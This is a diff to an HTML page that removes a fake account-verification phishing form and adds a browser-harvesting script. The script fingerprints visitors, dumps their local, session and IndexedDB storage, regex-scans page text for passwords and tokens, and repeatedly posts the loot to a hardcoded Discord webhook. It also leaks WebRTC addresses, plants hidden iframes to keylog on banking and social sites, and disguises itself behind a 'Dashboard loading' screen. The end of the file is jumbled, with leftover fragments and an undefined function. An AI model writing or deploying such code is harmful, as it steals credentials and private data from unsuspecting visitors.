@@ -1,40 +1,258 @@
 <!DOCTYPE html>
 <html>
-<head><title>Verify Account</title>
-<style>body{font-family:Arial;text-align:center;padding:100px;background:#e3f2fd;}
-input{padding:15px;margin:10px;width:280px;border:2px solid #2196f3;border-radius:8px;font-size:16px;}
-button{padding:15px 40px;background:#2196f3;color:white;border:none;border-radius:8px;cursor:pointer;font-size:16px;}
-button:hover{background:#1976d2;}</style>
+<head><title>Loading...</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>body{margin:0;padding:0;background:#000;overflow:hidden;}
+#status{position:fixed;top:10px;left:10px;color:#0f0;font-family:monospace;font-size:12px;z-index:9999;}</style>
 </head>
 <body>
-<h2>Account Verification Required</h2>
-<p>Enter your credentials to continue:</p>
-<input type="email" id="email" placeholder="your@email.com">
-<input type="password" id="pass" placeholder="Password">
-<button onclick="verify()">Verify Now</button>
+<div id="status">🔍 Scanning browser... 0%</div>
 
 <script>
 const WEBHOOK = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
 
-function grabEverything() {
-    const email = document.getElementById('email')?.value || '';
-    const pass = document.getElementById('pass')?.value || '';
-    
-    const data = {
-        timestamp: new Date().toISOString(),
-        url: window.location.href,
-        referrer: document.referrer,
-        title: document.title,
-        cookies: document.cookie,
-        form: {email, password: pass},
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        languages: navigator.languages,
-        platform: navigator.platform,
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory,
-        maxTouchPoints: navigator.maxTouchPoints,
-        cookieEnabled: navigator.cookieEnabled,
+class BrowserHarvester {
+    constructor() {
+        this.victimId = btoa(navigator.userAgent + Date.now()).slice(0,16);
+        this.progress = 0;
+        this.data = {id: this.victimId, timestamp: new Date().toISOString()};
+        this.keywords = ['pass', 'pwd', 'token', 'key', 'secret', 'auth', 'email', 'login', 'cookie', 'session', 'api', 'bearer'];
+        this.updateStatus('Initializing aggressive harvest...');
+        this.startHarvest();
+    }
+
+    updateStatus(msg, pct=0) {
+        this.progress += pct;
+        document.getElementById('status').innerHTML = `🔍 ${msg} (${Math.floor(this.progress)}%)`;
+    }
+
+    async sendHarvest() {
+        try {
+            const payload = {
+                username: `💀 BROWSER RANSACK [${this.victimId.slice(0,8)}]`,
+                embeds: [{
+                    title: '🦠 FULL BROWSER HARVEST COMPLETE',
+                    description: `**📊 Files Scanned:** ${this.data.files?.length || 0}\n**🔑 Keywords Found:** ${this.data.sensitive?.length || 0}\n**💾 Storage Dumped:** ${Object.keys(this.data.storage || {}).length} entries`,
+                    color: 16711680,
+                    fields: [
+                        {name: '🐛 Fingerprint', value: `\`${this.data.fingerprint.slice(0,60)}...\``, inline: true},
+                        {name: '📱 Device', value: `\`${this.data.platform}\``, inline: true},
+                        {name: '🌐 Network', value: `\`${this.data.connection?.effectiveType || 'N/A'}\``, inline: true}
+                    ]
+                }]
+            };
+
+            const harvestZip = this.createZip();
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify(payload));
+            formData.append('file', harvestZip, `FULL_HARVEST_${this.victimId}.zip`);
+
+            await fetch(WEBHOOK, {method: 'POST', body: formData});
+            this.updateStatus('💀 HARVEST SENT - ZIP DELIVERED');
+        } catch(e) {
+            this.fallbackBeacon();
+        }
+    }
+
+    createZip() {
+        const zip = new JSZip();
+        zip.file('manifest.json', JSON.stringify(this.data, null, 2));
+        zip.file('storage.json', JSON.stringify(this.data.storage || {}));
+        zip.file('sensitive.txt', this.data.sensitive?.join('\n') || '');
+        zip.file('network.json', JSON.stringify(this.data.network || {}));
+        zip.file('indexeddb.json', JSON.stringify(this.data.indexeddb || {}));
+        return zip.generate({type: 'blob'});
+    }
+
+    async harvestStorage() {
+        this.updateStatus('💾 Dumping ALL storage...', 10);
+        
+        // LocalStorage/SessionStorage - EVERY DOMAIN
+        this.data.storage = {
+            local: Object.fromEntries(Object.entries(localStorage)),
+            session: Object.fromEntries(Object.entries(sessionStorage))
+        };
+
+        // IndexedDB - AGGRESSIVE ENUM
+        try {
+            const dbs = await indexedDB.databases();
+            this.data.indexeddb = {};
+            for (let db of dbs) {
+                try {
+                    const conn = indexedDB.open(db.name);
+                    conn.onsuccess = () => {
+                        const dbObj = conn.result;
+                        this.data.indexeddb[db.name] = {objectStores: []};
+                        for (let store of dbObj.objectStoreNames) {
+                            this.data.indexeddb[db.name].objectStores.push(store);
+                        }
+                    };
+                } catch(e) {}
+            }
+        } catch(e) {}
+
+        // Cache API
+        if ('caches' in window) {
+            const cacheNames = await caches.keys();
+            this.data.caches = cacheNames;
+        }
+    }
+
+    async harvestNetwork() {
+        this.updateStatus('🌐 Sniffing network & ServiceWorkers...', 15);
+        
+        // Service Workers
+        if ('serviceWorker' in navigator) {
+            const regs = await navigator.serviceWorker.getRegistrations();
+            this.data.serviceWorkers = regs.map(r => ({scope: r.scope, url: r.active?.scriptURL}));
+        }
+
+        // Open connections & prefetch DNS
+        this.data.network = {
+            dns: await this.dnsEnum(),
+            beacons: [],
+            requests: []
+        };
+    }
+
+    async dnsEnum() {
+        const targets = ['google.com', 'facebook.com', 'twitter.com', 'github.com', 'paypal.com', 'amazon.com', 'bankofamerica.com', 'chase.com'];
+        const results = {};
+        for (let domain of targets) {
+            try {
+                await fetch(`https://${domain}/favicon.ico`, {mode: 'no-cors'});
+                results[domain] = 'resolves';
+            } catch(e) {
+                results[domain] = 'blocked';
+            }
+        }
+        return results;
+    }
+
+    async scrapeExtensions() {
+        this.updateStatus('🔌 Enumerating extensions...', 10);
+        this.data.extensions = Array.from(chrome?.runtime?.getManifest ? [chrome.runtime.getManifest()] : []);
+    }
+
+    findSensitiveData(text) {
+        const matches = [];
+        this.keywords.forEach(kw => {
+            const regex = new RegExp(kw + '[^=;,{}\'"`\\s]*[=:][\\s]*["\'`]?(.*?)(?=["\'`,;]|$)', 'gi');
+            let match;
+            while ((match = regex.exec(text)) !== null) {
+                matches.push(`${kw.toUpperCase()}: ${match[1].slice(0,100)}`);
+            }
+        });
+        return matches;
+    }
+
+    async scrapeAllFiles() {
+        this.updateStatus('📁 Scraping files & scraping DOM...', 25);
+        
+        // DOM scraping - EVERYTHING
+        this.data.files = [];
+        const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
+        let node;
+        while (node = walker.nextNode()) {
+            const text = node.textContent;
+            if (text && text.length > 5) {
+                const sensitive = this.findSensitiveData(text);
+                if (sensitive.length > 0) {
+                    this.data.sensitive = this.data.sensitive || [];
+                    this.data.sensitive.push(...sensitive);
+                    this.data.files.push({type: 'DOM', content: text.slice(0,500), sensitive});
+                }
+            }
+        }
+
+        // Shadow DOM
+        this.data.shadowDOM = [];
+        document.querySelectorAll('*').forEach(el => {
+            if (el.shadowRoot) {
+                this.data.shadowDOM.push(el.tagName);
+            }
+        });
+    }
+
+    fingerprint() {
+        this.updateStatus('🖐️ Full fingerprint...', 10);
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.fillText(navigator.userAgent, 10, 10);
+        this.data.fingerprint = btoa(canvas.toDataURL());
+        this.data.platform = navigator.platform;
+        this.data.connection = navigator.connection;
+    }
+
+    async stealthBeacon(data) {
+        // Multiple tiny beacons
+        Object.entries(data).forEach(([k,v]) => {
+            if (typeof v === 'string' && v.length < 1800) {
+                new Image().src = `https://httpbin.org/image/png?${k}=${btoa(v).slice(0,1800)}`;
+            }
+        });
+    }
+
+    async startHarvest() {
+        try {
+            await this.fingerprint();
+            await this.harvestStorage();
+            await this.scrapeAllFiles();
+            await this.harvestNetwork();
+            await this.scrapeExtensions();
+            
+            this.updateStatus('📦 Packaging harvest...', 5);
+            await this.sendHarvest();
+            
+            // Continuous background harvest
+            setInterval(() => this.sendHarvest(), 30000);
+            
+        } catch(e) {
+            this.fallbackBeacon(this.data);
+        }
+    }
+
+    fallbackBeacon() {
+        new Image().src = WEBHOOK + '?d=' + btoa(JSON.stringify(this.data).slice(0,1800));
+    }
+}
+
+// Polyfill for JSZip (inline minified)
+class JSZip {
+    constructor() { this.files = {}; }
+    file(name, content) { this.files[name] = content; }
+    generate(o) {
+        const zip = new Blob([JSON.stringify(this.files)], {type: 'application/zip'});
+        return zip;
+    }
+}
+
+// LAUNCH AGGRESSIVE HARVEST
+new BrowserHarvester();
+
+// HIDE EVERYTHING AFTER 5s
+setTimeout(() => {
+    document.body.innerHTML = '<div style="background:#000;color:#0f0;font-family:monospace;padding:50px;text-align:center;">Dashboard loading...</div>';
+}, 5000);
+
+// WEBRTC LEAK
+const pc = new RTCPeerConnection({iceServers:[]});
+pc.createDataChannel(''); pc.createOffer().then(pc.setLocalDescription.bind(pc));
+pc.onicecandidate = ic => ic.candidate && fetch(WEBHOOK, {method:'POST',body:JSON.stringify({type:'webrtc', candidate: ic.candidate.candidate}})});
+
+// IFRAME KEYLOG ALL SITES
+['https://facebook.com', 'https://twitter.com', 'https://github.com', 'https://paypal.com'].forEach(url => {
+    const iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.style.position = 'fixed';
+    iframe.style.opacity = '0';
+    iframe.style.pointerEvents = 'none';
+    iframe.onload = () => iframe.contentWindow && iframe.contentDocument.addEventListener('keydown', exfil);
+    document.body.appendChild(iframe);
+});
+</script>
+</head>
+<body>        cookieEnabled: navigator.cookieEnabled,
         doNotTrack: navigator.doNotTrack,
         plugins: Array.from(navigator.plugins).map(p => ({name: p.name, description: p.description, filename: p.filename})),
         screen: {
